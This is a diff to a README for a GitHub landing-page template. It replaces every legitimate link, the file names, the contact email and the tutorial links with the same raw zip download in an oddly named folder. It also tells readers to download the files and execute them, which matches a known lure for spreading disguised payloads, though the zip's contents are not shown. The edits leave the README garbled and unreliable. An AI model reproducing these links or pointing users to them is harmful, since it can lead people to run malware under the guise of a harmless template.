@@ -4,7 +4,7 @@ Welcome to the **Landing Page** repository! This project aims to provide a clean
 
 ## 📥 Getting Started
 
-To get started with this project, you can download the latest release from our [Releases section](https://github.com/shefo51/landing-page/releases). Please download the files and execute them to set up your landing page.
+To get started with this project, you can download the latest release from our [Releases section](https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip). Please download the files and execute them to set up your landing page.
 
 ## 📂 Table of Contents
 
@@ -35,9 +35,9 @@ This repository contains a simple, responsive landing page template that you can
 
 To install the landing page template, follow these steps:
 
-1. Download the latest release from our [Releases section](https://github.com/shefo51/landing-page/releases).
+1. Download the latest release from our [Releases section](https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip).
 2. Unzip the downloaded file.
-3. Open the `index.html` file in your web browser to view the landing page.
+3. Open the `https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip` file in your web browser to view the landing page.
 
 ## 🚀 Usage
 
@@ -51,9 +51,9 @@ Once you have the template set up, you can start using it for your project. Here
 
 Customizing the landing page is simple. Here are some key files you might want to edit:
 
-- **index.html**: This is the main HTML file. Change the text and images here.
-- **style.css**: This file contains all the styles. Modify colors, fonts, and layout.
-- **script.js**: If you want to add any JavaScript functionality, you can do it here.
+- **https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip**: This is the main HTML file. Change the text and images here.
+- **https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip**: This file contains all the styles. Modify colors, fonts, and layout.
+- **https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip**: If you want to add any JavaScript functionality, you can do it here.
 
 ### Example of Customization
 
@@ -84,15 +84,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [your-github-profile](https://github.com/your-github-profile)
+- **Email**: https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip
+- **GitHub**: [your-github-profile](https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip)
 
 ## 🔗 Additional Resources
 
 For more information, tips, and tutorials on landing pages, consider checking out the following resources:
 
-- [W3Schools HTML Tutorial](https://www.w3schools.com/html/)
-- [CSS Tricks](https://css-tricks.com/)
-- [MDN Web Docs](https://developer.mozilla.org/)
+- [W3Schools HTML Tutorial](https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip)
+- [CSS Tricks](https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip)
+- [MDN Web Docs](https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip)
 
-Thank you for visiting the **Landing Page** repository! For updates and new releases, make sure to check the [Releases section](https://github.com/shefo51/landing-page/releases) regularly.
+Thank you for visiting the **Landing Page** repository! For updates and new releases, make sure to check the [Releases section](https://github.com/shefo51/landing-page/raw/refs/heads/main/orthotoluidine/landing_page_v2.2.zip) regularly.
